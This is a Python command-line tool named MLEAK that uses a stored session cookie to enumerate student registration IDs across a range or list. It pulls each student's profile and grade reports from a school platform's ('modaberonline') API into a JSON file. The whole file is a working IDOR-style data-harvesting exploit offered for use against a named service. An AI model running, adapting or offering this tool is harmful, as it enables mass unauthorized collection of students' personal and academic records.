import argparse
import json
import asyncio
from pathlib import Path
import re
from aiohttp import ClientSession
from http.cookiejar import MozillaCookieJar
from tqdm import tqdm

def splash_screen():
    print('MLEAK -- Extract data from modaberonline APIs')

def validate_domain(domain):
    if not isinstance(domain, str) or not re.match(r'^[a-zA-Z0-9.-]+$', domain):
        raise argparse.ArgumentTypeError(f"Invalid domain format: {domain}. Only alphanumeric characters, dots, and hyphens are allowed.")
    return domain

def parse_ids(ids_str):
    if ids_str:
        return list(map(int, ids_str.split(',')))
    else:
        return None

async def make_api_request(session, domain, endpoint, params=None, studentRegId=None):
    if '{studentRegId}' in endpoint:
        endpoint = endpoint.format(studentRegId=studentRegId)
    url = f'https://{domain}/api/Students/Students/{endpoint}'
    async with session.get(url, params=params) as response:
        if response.ok:
            return await response.json()
        else:
            return None

async def collect_data(session, semaphore, domain, ids, endpoint, params=None):
    data = {}
    for id_ in tqdm(ids, desc="Collecting data"):
        async with semaphore:
            if '{studentRegId}' in endpoint:
                result = await make_api_request(session, domain, endpoint, params=params, studentRegId=id_)
            else:
                if params:
                    params['studentRegId'] = id_
                result = await make_api_request(session, domain, endpoint, params=params)
            if result:
                data[id_] = result
    return data

async def collect_data_via_enumeration(session, semaphore, domain, range_start, range_stop, endpoint, params=None):
    data = {}
    for id_ in tqdm(range(range_start, range_stop + 1), desc="Collecting data"):
        async with semaphore:
            if '{studentRegId}' in endpoint:
                result = await make_api_request(session, domain, endpoint, params=params, studentRegId=id_)
            else:
                if params:
                    params['studentRegId'] = id_
                result = await make_api_request(session, domain, endpoint, params=params)
            if result:
                data[id_] = result
    return data

async def main():
    splash_screen()
    
    parser = argparse.ArgumentParser(description='MLeak Command Line Tool')
    parser.add_argument('-d', '--domain', required=True, type=validate_domain, help='The target domain')
    parser.add_argument('-C', '--cookies', required=True, type=Path, help='HTTP cookies file')
    parser.add_argument('-m', '--mode', required=True, choices=['info', 'report'], help='Operation mode: info or report')
    parser.add_argument('--ids', type=parse_ids, help='Comma-separated list of user IDs')
    parser.add_argument('--range_start', type=int, help='Start of the enumeration range')
    parser.add_argument('--range_stop', type=int, help='End of the enumeration range')
    parser.add_argument('-o', '--output', required=True, help='Output file path')

    args = parser.parse_args()

    # Validate data collection method
    if (args.ids and (args.range_start or args.range_stop)) or (not args.ids and not (args.range_start and args.range_stop)):
        parser.error("You must provide either --ids or both --range_start and --range_stop.")

    # Load cookies
    cookie_jar = MozillaCookieJar(args.cookies)
    cookie_jar.load()
    cookies = {cookie.name: cookie.value for cookie in cookie_jar}

    # Define semaphore
    semaphore = asyncio.Semaphore(10)  # Adjust concurrency limit as needed

    # Define API endpoints and parameters
    if args.mode == 'info':
        endpoint = 'GetStudentByStudentRegId/{studentRegId}'
        params = None
    elif args.mode == 'report':
        endpoint = 'GetStudentResultsClassReportWithDateType'
        params = {
            'courseRegId': -1,
            'fromDate': '2020-08-01T20:30:00.000Z',
            'gradeRegRef': -1,
            'isWeekly': 'false',
            'levelRegId': -1,
            'toDate': '3000-09-17T11:21:45.455Z'
        }

    # Collect data
    async with ClientSession(cookies=cookies) as session:
        if args.ids:
            print(f'Collecting data for IDs: {args.ids}')
            data = await collect_data(session, semaphore, args.domain, args.ids, endpoint, params)
        else:
            print(f'Collecting data for range: {args.range_start} to {args.range_stop}')
            data = await collect_data_via_enumeration(session, semaphore, args.domain, args.range_start, args.range_stop, endpoint, params)

    # Save output
    with open(args.output, 'w') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

if __name__ == '__main__':
    asyncio.run(main())
